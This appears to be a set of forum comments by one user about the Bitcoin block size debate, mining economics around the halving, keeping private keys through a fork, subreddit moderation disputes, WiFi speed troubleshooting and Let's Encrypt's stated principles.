* The **NOTICE** looks like a seizure notice, a DMCA take-down notice, or some other type of error and at first glance makes me think there is something wrong with the site.

My suggestions:

* Make the popup slightly less obnoxious, at least not nearly the entire screen as it is now. Make it so readers can see more than just a giant black and white popup **NOTICE** and that there is actual content behind the popup.

* Maybe use less dimming on the background behind the **NOTICE** so users can more easily see the actual page behind it.

* Spruce the notice up a little bit! Add some color or design, maybe something a little more descriptive than just **NOTICE**, it could be framed as a PSA meant to help and inform Bitcoin enthusiasts. Hell, even the FBI and DEA make eye-catching take-down/seizure notices.

Maybe I'm different from others visiting the site or I'm not your target demographic, but these are my thoughts.

I hope this helps. Keep up the excellent work. </TEXT>

Keyword here.

But really though, objections are objections, reasonable or not.

Just look at how XT got picked apart for having other changes besides an 8MB block size limit.

At this point the debate is about more than just the max block size or other improvements, it's about governance of Bitcoin.

Though I imagine at some point in the future thin blocks will be merged, regardless of how this debacle turns out. </TEXT>

Thank you for coming over here and initializing a civil conversation. I have some strong disagreements with you on certain topics, but discussing the economics of mining is not something I feel warrants anything less than civility.

Am I correct in interpreting your comments as follows?

I think what Adam is saying is that the 'switch on price' is a lot higher than a 'switch off price' because to initially switch on requires a relatively significant investment in initial mining infrastructure.

I imagine there is also a 'switch back on price' that is equal to or just slightly higher than the 'switch off price' for miners that have switched off. </TEXT>

<TEXT>  There is a huge difference between the switch on price (what reward per GH you'd need to see to make a mining investment) and the switch off price (what reward per GH you'd switch off at because it is below electrical efficiency break-even).

Assuming all things stay the same (mainly price though), won't the halving significantly increase the switch off price for many miners?

My understanding is that it is based on:

* The miner's cost of electricity
* The miner's mining efficiency

Meaning miners with some of the higher costs of electricity (or lower efficiencies) may have to turn off?

Is it correct to say that it's hard to know exactly what will happen as none of us know what future price movements will be? </TEXT>

<TEXT> There's a lot of nuances to what may or may not happen, but the important thing from a practical aspect is to make sure you control your coins with your own private keys (e.g. don't use a 3rd party wallet like a webwallet).

* If there's a fork and you control your own private keys, you will then have coins on both forks.
* If there's a fork and you do not control your own private keys, you're at the mercy of the 3rd party who may or may not give you coins on both forks. </TEXT>

<TEXT> This is what bothers me. He was one of the few semi-reasonable people over there.

I understand he is pointing out that there are shenanigans, propaganda, and poo-flinging on both sides of the debate, and I fully agree that they exist and I applaud him for trying to point it out in a rational manner.

But when someone says

 [No /r/bitcoin mod will likely respond to this, since you guys have proven that you will just censor any reply they make](https://www.reddit.com/r/btc/comments/49nf9e/mods_of_rbitcoin_why_did_you_censor_information/d0tc22x)

then implies that downvoting is the same as censorship (and makes no mention of massive amounts of actual deletion on r\Bitcoin)

 [But the mods of this subreddit are not the real problem, so discussing them is besides the point. The real problem is the culture of downvoting that the people here have. A /r/bitcoin mod could reply to every single complaint made in this subreddit, but 90% of the users wouldn't ever know that they did. They would get the wrong impression that the /r/bitcoin mods were ignoring them. This just feeds back into itself to form a never-ending cycle.](https://www.reddit.com/r/btc/comments/49nf9e/mods_of_rbitcoin_why_did_you_censor_information/d0th9wu)

I have a problem with that and in my eyes it greatly lowers his credibility. </TEXT>

<TEXT> Yeah, I'll elaborate.

You said your WiFi is at 5% of 1Gbps, which is about 50 Mbps.

802.11a and 802.11g both operate at a maximum speed of 54 Mbps, but 802.11a is not that common, so I assume you're on 802.11g.

That means your WiFi adapter on your laptop and your WiFi router are both operating on 802.11g.

However, each of them may be capable of operating at 802.11n or 802.11ac.

It may be worth checking their specs to see if they can operate on 802.11n or 802.11ac.

802.11n has a maximum speed of 150 to 600 Mbps.

802.11ac has a maximum speed of 150 to 6,934 Mbps (I think, you may want to double check this upper limit if you care to.)

But yeah, I'd imagine that the built in WiFi adapter in a 2 year old high end laptop would support 802.11n and probably 802.11ac too.

Your WiFi router could be the limiting factor here.

Or just plug your laptop directly into your modem and/or router and bypass WiFi. :-)

I hope this helps. </TEXT>

<TEXT> I hear what you're saying, but most of the people here have been banned or otherwise censored on r\Bitcoin. There's a serious axe to grind, and frankly, I think that heavy-handed censorship by a single person who owns 3 of the major Bitcoin forums is a major issue that people need to be aware of, and apparently want to discuss.

It can really be a serious eye-opener when someone who's only been reading r\Bitcoin comes to /r/btc and sees 13,000 subscribers and about 40% as many active users and sees a bunch of topics that are rarely if ever seen on /r/btc.

When censorship is less of an issue, upvoted posts will reflect this.

So that all said...

Dear OP and others, please consider using r\Bitcoin when discussing the other subreddit:

There's a big difference between deletion and downvoting.

Some people have actively chosen to make no distinction between the two while using the word 'censor'.

FYI, I did not not downvote this because I want more people to see this, but I did not upvote this because I feel that the way some people are using the word 'censor' is disingenuous. </TEXT>

<TEXT> From https://letsencrypt.org/about/

Lets Encrypt is a free, automated, and open certificate authority (CA), run for the publics benefit. Lets Encrypt is a service provided by the [Internet Security Research Group (ISRG)](https://letsencrypt.org/isrg/).

The key principles behind Lets Encrypt are:

* **Free:** Anyone who owns a domain name can use Lets Encrypt to obtain a trusted certificate at zero cost.
* **Automatic:** Software running on a web server can interact with Lets Encrypt to painlessly obtain a certificate, securely configure it for use, and automatically take care of renewal.
* **Secure:** Lets Encrypt will serve as a platform for advancing TLS security best practices, both on the CA side and by helping site operators properly secure their servers.
* **Transparent:** All certificates issued or revoked will be publicly recorded and available for anyone to inspect.
* **Open:** The automatic issuance and renewal protocol will be published as an open standard that others can adopt.
* **Cooperative:** Much like the underlying Internet protocols themselves, Lets Encrypt is a joint effort to benefit the community, beyond the control of any one organization. </TEXT>
